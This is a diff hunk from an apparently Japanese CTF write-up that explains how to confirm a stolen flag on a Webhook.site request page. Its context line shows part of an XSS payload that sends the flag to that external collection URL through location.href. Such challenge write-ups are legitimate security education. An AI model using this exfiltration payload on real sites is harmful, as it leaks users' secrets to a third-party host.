@@ -121,7 +121,7 @@ location.href="https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx/?flag="
 
 うまくいくと、Webhook.siteの自分専用確認ページにリクエストが届いているはずです。
 
-このリクエストを選択し、`Query strings`の`flag`に`Alpaca{REDACTED}`が表示されていることを確認します。
+このリクエストを選択し、`Query strings`の`flag`に`FLAG=Alpaca{REDACTED}`が表示されていることを確認します。
 
 ※nonceは固定ではあるもののローカル環境と本番環境では少し違うようなので、本番環境で実行するときは改めて確認してください。
 
